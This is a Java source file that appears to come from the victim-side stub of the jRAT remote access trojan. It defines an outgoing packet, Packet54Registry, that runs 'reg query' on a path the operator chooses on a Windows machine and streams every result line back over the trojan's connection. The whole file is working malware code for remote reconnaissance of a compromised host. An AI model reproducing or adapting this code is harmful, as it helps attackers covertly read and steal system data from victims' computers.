package se.jrat.stub.packets.outgoing;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;

import se.jrat.common.io.StringWriter;

import com.redpois0n.oslib.OperatingSystem;


public class Packet54Registry extends AbstractOutgoingPacket {

	private String path;

	public Packet54Registry(String path) {
		this.path = path;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		try {
			sw.writeLine(path);
			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
				Process p = Runtime.getRuntime().exec(new String[] { "reg", "query", path });

				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

				String line;

				while ((line = reader.readLine()) != null) {
					dos.writeBoolean(true);
					sw.writeLine(line);
					System.out.println(line);
				}
				reader.close();
			} else {
				throw new Exception("Windows only");
			}
			
			dos.writeBoolean(false);
		} catch (Exception ex) {
			ex.printStackTrace(); //Connection.addToSendQueue(new Packet54Registry("", new String[] { "1", "Error: " + ex.getClass().getSimpleName() + ": " + ex.getMessage() }));
		}
	}

	@Override
	public byte getPacketId() {
		return 54;
	}

}
